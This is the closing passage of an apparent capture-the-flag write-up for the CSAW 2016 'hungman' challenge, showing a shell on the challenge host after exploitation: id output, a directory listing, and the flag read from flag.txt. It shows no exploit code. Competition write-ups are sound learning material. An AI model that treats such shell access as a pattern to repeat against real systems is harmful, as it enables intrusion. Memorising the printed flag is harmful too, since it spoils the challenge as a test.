        uid=1000(hungman) gid=1000(hungman) groups=1000(hungman)
    ls -la
        total 36
        drwxr-x---  2 root hungman  4096 Sep 16 21:31 .
        drwxr-xr-x 10 root root     4096 Sep 16 21:31 ..
        -rw-r--r--  1 root hungman   220 Sep 16 21:31 .bash_logout
        -rw-r--r--  1 root hungman  3771 Sep 16 21:31 .bashrc
        -rw-r--r--  1 root hungman   655 Sep 16 21:31 .profile
        -rw-rw-r--  1 root root       41 Sep 16 21:13 flag.txt
        -rwxrwxr-x  1 root root    10464 Sep 16 21:13 hungman
    cat flag.txt
        flag{this_looks_like_its_a_well_hungman}
    exit
*** Connection closed by remote host ***
root@nogirl:~/ctf/csaw_16# 
'''

```

___
